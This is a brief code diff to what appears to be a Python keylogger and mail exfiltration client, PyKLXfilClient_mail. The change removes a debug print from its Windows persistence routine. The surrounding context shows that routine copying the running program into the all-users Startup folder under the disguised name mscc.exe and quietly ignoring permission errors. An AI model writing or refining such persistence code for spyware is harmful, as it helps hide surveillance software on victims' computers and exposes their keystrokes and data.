@@ -33,7 +33,6 @@ class PyKLXfilClient_mail:
         #persistence if running as admin in windows
         if os.name == 'nt':
             try:
-                print(sys.argv[0])
                 copyfile(sys.argv[0], r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\mscc.exe")
             except PermissionError:
                 pass
